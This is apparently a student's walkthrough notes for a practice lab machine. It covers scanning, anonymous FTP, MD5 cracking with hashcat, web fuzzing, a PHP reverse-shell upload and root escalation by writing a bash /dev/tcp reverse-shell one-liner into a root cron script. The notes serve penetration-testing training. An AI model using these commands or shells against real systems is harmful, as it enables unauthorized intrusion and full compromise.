ftp port 21:
version vsftpd 3.0.3
allows anonymous login

ssh port 22
version OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

http port 80
version  Apache httpd 2.4.38 ((Debian))


80 - 192.168.5.5 - 16:50 14/02/2024
Default Webpage - Apache - PHP



![[Pasted image 20240214104859.png]]

- `sudo netdiscover -r 10.0.2.0/24`
- `nmap -T4 -p- -A 10.0.2.152`  
- port 80 open => try to look at http://10.0.2.152
#### FTP
- port 21 open
- There is a file         [[Notes/TCM/ETH/Capstones/Academy/nmap|Look inside nmap scan]]
=>
try to connect as anonymous 
`ftp 10.0.2.152`
`anonymous`
try to get the file -->  `get note.txt`

> [!TIP] This can be intresting:
>- we don't know the file position inside the victim machine
>- HTTP is open =>  always good to check if` http://10.0.2.152/note` exists
>- if exist => we can <span style="color:#00b050">upload</span> a malicious <span style="color:#00b050">file using FTP</span>
>- execute it
	
exit from ftp and `cat note.txt`
![[Pasted image 20240214154532.png]]
- We found a password
- Probably is an hash
- Check what type with tool [[cheet#Hash-identifier|hash-identifier]] 
- `hash-identifier
- `cd73502828457d15655bbd7a63fb0bc8`
- probably is a --> MD5 hash
	- => try to crack hash with [[cheet#hashcat|hashcat]] + [[cheet#Locate|locate]]
	- locate rockyou.txt
	- echo "type here the hash" > hash.txt
	- `hashcat -m 0 Desktop/TCM/ETH/VMe/Academy/hash.txt` `Desktop/TCM/rockyou.txt` 
	- <span style="color:#00b050">We found a password</span> -->  student
	- ![[Pasted image 20240214160424.png]]

Now we have a userid + password 
But we don't know for what it's used
=>
Let's check if it exists a web page where we can enter these credentials
=>
#### Enumerate HTTP
we can use [[cheet#dirb|dirb]] or [[cheet#ffuf|ffuf]]
`ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ_VARIABLE -u http://10.0.2.152/FUZZ_VARIABLE`
=>
<span style="color:#00b050">we found an "academy" path</span>
![[Pasted image 20240214162425.png]]
- go to `http://10.0.2.152/academy `and try to login with the userid + pass
- <span style="color:#00b050">We can login </span>
- there is a form where you can upload an image
- maybe we can also <span style="color:#00b050">upload</span> other files
- for example a <span style="color:#00b050">reverse shell</span> 
- search -->  for php reverse shell
- [Save this script locally](https://github.com/pentestmonkey/php-reverse-shell)
- change the IP in the script to your ip
- use netcat for listening to the port defined inside the script
	 - nc -nvlp 1234
	 - upload the shell in the form
	 - <span style="color:#00b050">we get a shell</span>
	 - ![[Pasted image 20240214163740.png]]
		    it's not priviliged
	=>
	it's time to privilege escalation
##### Privilege escalation
we'll use [[cheet#linpeas|linpeas]] to search any potential privilege escalation
- follow all the steps inside linpeas
- <span style="color:#00b050">we'll find a password</span> -->  My_V3ryS3cur3_P4ss
	- we can cat the file where the password is stored
	- `cat /var/www/html/academy/includes/config.php`
	- ![[Pasted image 20240214171514.png]]
	- <span style="color:#00b050">we find a user grimmie for the password</span>
- try to connect via shh -->  `ssh grimmie@10.0.2.152`
- <span style="color:#00b050">we enter</span>
- we are not root
	  => we need to become root
	![[Pasted image 20240214171831.png]]

- inside there is a backup.sh
- In some ways we can find that this script is executed every minute
	- if we change it so that it executes a shell 
	     =>
	     we have finished
	=>
	- search on google -->  [bash reverse shell one liner](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
	- we find our bash shell -->  `bash -i >& /dev/tcp/10.0.2.15/8080 0>&1`
	- changed the ip to the attacker ip
	- from the attacker machine -->  listen on 8080
							     `nc -nvlp 8080`
	- inside backup.sh delete all and paste --> `bash -i >& /dev/tcp/10.0.2.15/8080 0>&1`
	- Here we are!
	- <span style="color:#00b050">We have root access</span>
	- ![[Pasted image 20240214174016.png]]


> [!INFO] 
>This worked because the backup.sh script is executed by root each minute






